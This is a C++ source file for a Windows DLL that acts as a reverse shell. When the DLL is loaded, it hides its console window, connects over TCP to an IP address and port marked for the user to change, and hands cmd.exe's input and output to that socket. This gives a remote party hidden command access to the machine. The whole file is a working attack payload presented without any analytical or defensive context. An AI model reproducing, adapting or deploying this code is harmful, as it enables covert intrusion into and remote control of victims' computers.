#include <Windows.h>
#include <iostream>
#include <string>
#include <WinSock2.h>
#include <stdio.h>

WSADATA wsadata;
SOCKET wSock;
struct sockaddr_in rev_shell;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main_func()
{
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    char *ip = "127.0.0.1"; //Change 
    short port = 4444; //Change

    WSAStartup(MAKEWORD(2, 2), &wsadata);

    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    rev_shell.sin_family = AF_INET;
    rev_shell.sin_port = htons(port);
    rev_shell.sin_addr.s_addr = inet_addr(ip);

    WSAConnect(wSock, (SOCKADDR*)&rev_shell, sizeof(rev_shell), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    CreateProcess(NULL, L"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);
}

BOOL APIENTRY DLLMain(HMODULE hmodule, DWORD call_reason, LPVOID lp_reserved)
{
    switch(call_reason)
    {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hmodule);
            main_func();
            break;
        case DLL_PROCESS_DETACH:
            break;

    }
    return TRUE;
}